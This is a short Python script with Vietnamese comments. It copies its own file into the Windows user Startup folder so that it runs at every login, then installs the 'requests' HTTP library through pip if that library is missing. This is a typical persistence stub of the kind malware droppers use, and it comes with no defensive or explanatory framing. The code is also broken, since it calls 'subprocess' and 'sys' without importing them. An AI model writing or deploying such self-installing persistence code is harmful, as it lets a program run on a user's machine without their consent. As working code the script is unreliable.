import os
import shutil

# Đường dẫn của tệp hiện tại
current_file = __file__

# Đường dẫn tới thư mục Startup của người dùng
startup_folder = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')

# Đường dẫn tới tệp trong thư mục Startup (giữ nguyên tên gốc của tệp)
destination_file = os.path.join(startup_folder, os.path.basename(current_file))

# Sao chép tệp hiện tại vào thư mục Startup
if not os.path.exists(destination_file):
    shutil.copy(current_file, destination_file)
    print(f"Tệp đã được sao chép vào {destination_file}")
else:
    print(f"Tệp đã tồn tại trong {destination_file}")

try:
    import requests
except ImportError:
    print("Module 'requests' chưa được cài đặt. Đang cài đặt...")
    # Cài đặt requests nếu chưa có
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
    
    # Thử import lại sau khi cài đặt
    try:
        import requests
        print("Cài đặt và import 'requests' thành công!")
    except ImportError:
        print("Cài đặt không thành công.")
